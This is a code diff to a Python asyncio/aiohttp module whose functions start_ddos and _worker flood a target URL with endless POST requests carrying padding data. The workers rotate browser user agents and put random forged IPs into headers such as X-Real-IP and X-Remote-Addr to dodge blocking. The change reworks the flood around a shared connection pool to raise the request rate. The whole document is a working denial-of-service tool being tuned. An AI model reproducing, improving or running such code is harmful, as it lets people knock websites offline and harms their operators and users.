@@ -884,7 +884,7 @@ USER_AGENTS = [
     "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
 ]
 
-async def _worker(worker_id, target, kb_size, on_update):
+async def _worker(worker_id, target, kb_size, on_update, session):
     global _is_running, _total_requests
     try:
         payload_kb = int(kb_size) if kb_size else 10
@@ -894,17 +894,11 @@ async def _worker(worker_id, target, kb_size, on_update):
     except:
         data = b"A" * 10240
 
-    connector = aiohttp.TCPConnector(
-        limit=0, limit_per_host=0, force_close=True,
-        enable_cleanup_closed=True, ttl_dns_cache=0,
-        use_dns_cache=False, ssl=False
-    )
-    session = aiohttp.ClientSession(connector=connector)
-
     try:
         while _is_running:
+            fake_ip = ""         
             try:
-                fake_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"    
+                fake_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
                 headers = {
                     "User-Agent": random.choice(USER_AGENTS),
                     "X-Real-IP": fake_ip,
@@ -914,7 +908,7 @@ async def _worker(worker_id, target, kb_size, on_update):
                     "X-Remote-IP": fake_ip,
                     "X-Remote-Addr": fake_ip,
                     "Originating-IP": fake_ip,
-                    "Content-Type": "application/x-www-form-urlencoded",
+                    "Content-Type": "application/octet-stream",
                     "Accept": "*/*",
                     "Accept-Language": "en-US,en;q=0.9",
                     "Accept-Encoding": "gzip, deflate, br",
@@ -922,7 +916,7 @@ async def _worker(worker_id, target, kb_size, on_update):
                     "Cache-Control": "no-cache",
                     "Pragma": "no-cache"
                 }
-                async with session.post(target, data=data, headers=headers, timeout=10) as resp:
+                async with session.post(target, data=data, headers=headers) as resp:
                     status = resp.status
                     await resp.read()
                 _total_requests += 1
@@ -934,7 +928,7 @@ async def _worker(worker_id, target, kb_size, on_update):
                 on_update(_total_requests, fake_ip, None)
             await asyncio.sleep(0)
     finally:
-        await session.close()
+        pass   \
 
 async def _monitor(on_stats):
     global _is_running
@@ -948,19 +942,32 @@ async def _monitor(on_stats):
         on_stats(int(elapsed), rps, current)
         last_count = current
 
+_session = None   # на уровне модуля
+
 async def start_ddos(target, kb_size, workers, on_update, on_stats):
-    global _is_running, _total_requests, _tasks, _monitor_task
+    global _is_running, _total_requests, _tasks, _monitor_task, _session
     stop_ddos()
     _is_running = True
     _total_requests = 0
     _tasks.clear()
+
+    connector = aiohttp.TCPConnector(
+        limit=500, limit_per_host=500, force_close=False,
+        enable_cleanup_closed=False, ttl_dns_cache=300,
+        use_dns_cache=True, ssl=False
+    )
+    _session = aiohttp.ClientSession(
+        connector=connector,
+        timeout=aiohttp.ClientTimeout(total=10, connect=5, sock_read=5),
+    )
+
     for i in range(workers):
-        task = asyncio.create_task(_worker(i, target, kb_size, on_update))
+        task = asyncio.create_task(_worker(i, target, kb_size, on_update, _session))
         _tasks.append(task)
     _monitor_task = asyncio.create_task(_monitor(on_stats))
 
 def stop_ddos():
-    global _is_running, _tasks, _monitor_task
+    global _is_running, _tasks, _monitor_task, _session
     if _is_running:
         _is_running = False
         for task in _tasks:
@@ -970,6 +977,9 @@ def stop_ddos():
             _monitor_task.cancel()
         _tasks.clear()
         _monitor_task = None
+    if _session and not _session.closed:
+        asyncio.create_task(_session.close())   
+        _session = None
 
 def is_ddos_running():
     return _is_running
